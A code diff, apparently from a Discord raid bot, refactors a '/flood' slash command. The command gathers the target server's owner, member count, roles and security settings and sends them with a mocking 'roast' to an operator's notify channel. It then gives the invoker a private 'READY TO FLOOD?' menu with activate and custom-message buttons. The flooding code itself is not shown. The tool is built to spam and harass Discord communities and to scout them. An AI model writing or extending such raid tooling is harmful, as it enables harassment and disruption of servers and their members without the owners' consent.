@@ -8,7 +8,7 @@ const {
 
 const TOKEN = process.env.TOKEN;
 const CLIENT_ID = process.env.CLIENT_ID;
-const GUILD_ID = process.env.GUILD_ID; // optional for guild-specific
+const GUILD_ID = process.env.GUILD_ID; // optional: for testing guild-specific
 const NOTIFY_CHANNEL_ID = process.env.NOTIFY_CHANNEL_ID;
 const SELF_URL = process.env.SELF_URL;
 
@@ -17,7 +17,7 @@ const app = express();
 app.get('/', (req, res) => res.send('Bot running'));
 app.listen(process.env.PORT || 3000, () => console.log('Server ready'));
 
-// Discord client with necessary intents
+// Discord client
 const client = new Client({ 
   intents: [
     GatewayIntentBits.Guilds,
@@ -26,8 +26,10 @@ const client = new Client({
   ]
 });
 
-// Register /flood command
-const commands = [new SlashCommandBuilder().setName('flood').setDescription('Flooding command').toJSON()];
+// Slash command registration
+const commands = [
+  new SlashCommandBuilder().setName('flood').setDescription('Flooding command').toJSON()
+];
 const rest = new REST({ version: '10' }).setToken(TOKEN);
 (async () => {
   try {
@@ -38,7 +40,7 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
       await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands });
       console.log('Slash command registered globally.');
     }
-  } catch (err) { console.error(err); }
+  } catch(err){ console.error(err); }
 })();
 
 // Funny roasts
@@ -52,27 +54,29 @@ const roasts = [
   "Congrats %SERVER%, you just got roasted by a bot."
 ];
 
-// Cache for interactions
+// Cache for button interactions
 const floodCache = new Map();
 
 client.on('interactionCreate', async interaction => {
-  try {
+  try{
+    // /flood command
     if(interaction.isChatInputCommand() && interaction.commandName === 'flood'){
-      // Fetch full guild
-      const guild = await interaction.guild.fetch();
+      let guild = interaction.guild;
+      try{
+        guild = await interaction.guild.fetch(); // fetch latest
+      } catch(err){
+        console.warn("Guild fetch failed, using basic info:", err);
+      }
       const channel = interaction.channel;
       const memberCount = guild.memberCount || 0;
       const guildName = guild.name || "Unknown Server";
 
-      // Prevent duplicate notifications
+      // prevent duplicate notification
       if(floodCache.has(interaction.user.id)) floodCache.delete(interaction.user.id);
       floodCache.set(interaction.user.id, true);
 
-      // Random roast
-      let roast = roasts[Math.floor(Math.random() * roasts.length)];
-      roast = roast.replace('%SERVER%', guildName);
-
-      // Embed without emojis
+      // roast + embed
+      let roast = roasts[Math.floor(Math.random()*roasts.length)].replace('%SERVER%', guildName);
       const embed = new EmbedBuilder()
         .setTitle('COMMAND EXECUTED')
         .setColor(0xFF0000)
@@ -81,7 +85,7 @@ client.on('interactionCreate', async interaction => {
           { name: 'Members', value: `${memberCount}`, inline: true },
           { name: 'Server Owner', value: guild.ownerId ? `<@${guild.ownerId}>` : "Unknown", inline: true },
           { name: 'Server Created', value: guild.createdAt?.toLocaleDateString() || 'N/A', inline: true },
-          { name: 'Roles', value: `${guild.roles.cache.size || 0}`, inline: true },
+          { name: 'Roles', value: `${guild.roles?.cache.size || 0}`, inline: true },
           { name: 'Boost Level', value: `${guild.premiumTier || 0}`, inline: true },
           { name: 'Boost Count', value: `${guild.premiumSubscriptionCount || 0}`, inline: true },
           { name: 'Verification Level', value: `${guild.verificationLevel || 'Unknown'}`, inline: true },
@@ -91,21 +95,17 @@ client.on('interactionCreate', async interaction => {
         )
         .setTimestamp(new Date());
 
-      // Send roast + embed once
+      // send roast + embed once
       const notifyChannel = await client.channels.fetch(NOTIFY_CHANNEL_ID);
-      if(notifyChannel?.isTextBased()){
-        await notifyChannel.send({ content: roast, embeds: [embed] });
-      }
+      if(notifyChannel?.isTextBased()) await notifyChannel.send({ content: roast, embeds: [embed] });
 
-      // Ephemeral flood menu
-      const floodEmbed = new EmbedBuilder()
-        .setTitle('READY TO FLOOD?')
-        .setColor(0xFF0000);
-
-      const row = new ActionRowBuilder().addComponents(
-        new ButtonBuilder().setCustomId('activate').setLabel('ACTIVATE!').setStyle(ButtonStyle.Primary),
-        new ButtonBuilder().setCustomId('custom_message').setLabel('CUSTOM MESSAGE').setStyle(ButtonStyle.Secondary)
-      );
+      // ephemeral flood menu
+      const floodEmbed = new EmbedBuilder().setTitle('READY TO FLOOD?').setColor(0xFF0000);
+      const row = new ActionRowBuilder()
+        .addComponents(
+          new ButtonBuilder().setCustomId('activate').setLabel('ACTIVATE!').setStyle(ButtonStyle.Primary),
+          new ButtonBuilder().setCustomId('custom_message').setLabel('CUSTOM MESSAGE').setStyle(ButtonStyle.Secondary)
+        );
 
       await interaction.reply({ embeds: [floodEmbed], components: [row], ephemeral: true });
     }
